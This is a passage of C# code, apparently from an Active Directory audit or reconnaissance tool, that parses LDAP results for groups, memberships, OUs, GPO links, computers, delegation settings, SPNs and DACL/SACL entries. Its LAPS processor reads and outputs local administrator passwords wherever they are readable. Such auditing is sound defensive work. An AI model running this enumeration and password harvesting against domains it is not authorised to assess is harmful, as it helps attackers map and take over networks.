                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        foreach (String GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        // TO DO
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    String gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    String GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (String link in GPLinks)
                    {
                        String[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    String StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    String OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? AdComputer.Properties["name"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? AdComputer.Properties["samaccountname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? AdComputer.Properties["Description"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (String SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        String[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (String) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = String.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Properties["name"][0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    String Name = null;
                    String Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            String Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    String Name = null;
                    String Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
